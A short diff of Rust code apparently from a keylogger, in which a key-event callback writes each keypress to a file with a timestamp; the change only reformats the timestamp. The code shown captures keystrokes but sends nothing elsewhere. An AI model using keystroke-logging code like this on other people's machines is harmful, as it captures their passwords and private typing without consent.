@@ -55,7 +55,8 @@ fn callback(event: Event, mut file: File) {
     match event.name {
         Some(mut string) => {
             string = string.replace("\r", "\\r");
-            let formatted_string = format!("{} | Keypress: {}\n", chrono::offset::Utc::now(), string);
+            let time = chrono::offset::Utc::now().format("%Y-%m-%d %H:%M:%S UTC").to_string();
+            let formatted_string = format!("{} | Keypress: {}\n", time, string);
             match file.write_all(formatted_string.as_bytes()) {
                 Err(error) => panic!("Error writing the file: {:?}", error),
                 _ => ()
